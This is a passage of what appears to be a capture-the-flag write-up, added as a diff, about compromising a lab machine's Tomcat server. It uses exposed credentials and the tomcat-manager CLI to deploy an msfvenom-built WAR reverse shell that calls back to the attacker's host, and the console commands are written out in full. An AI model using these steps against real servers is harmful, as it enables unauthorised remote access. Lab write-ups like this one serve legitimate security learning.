@@ -103,3 +103,32 @@ Using those definitive paths I could try to retrieve the config file from the re
    <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
 </tomcat-users>
 ```
+
+I was able to grab and read the file from the host and we can easily see the credentials for tomcat running on 8080.
+
+However while trying to connect with the given credentials on http://10.10.10.194:8080/manager I noticed that the I could not access the GUI panel, so I started googling about possible other ways.
+
+After some time I came up with an interesting pip module : **tomcat-manager** which could help me use the panel through CLI .
+
+![tomcatmgr](githuburl)
+
+I found this module very helpful because not only I was able to connect to the tomcat manager service but I could also upload files through it.
+
+So quickly create a payload using msfvenom and drop it to the web service using *tomcatmanager* :
+
+```console
+root@kali:~# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.30 LPORT=9001 -f war > shell.war
+Payload size: 1090 bytes
+Final size of war file: 1090 bytes
+
+root@kali:~# tomcat-manager
+tomcat-manager> connect http://10.10.10.194:8080/manager tomcat "$3cureP4s5w0rd123!"
+--connected to http://10.10.10.194:8080/manager as tomcat
+tomcat-manager> deploy local shell.war /zdf
+tomcat-manager>
+```
+With the payload already uploaded to the web server , what's left to do is to navigate on ``http://10.10.10.194:8080/zdf`` in my case to triger the payload and recieve a reverse shell to my machine : 
+
+![tomcat-shell](githuburl)
+
+
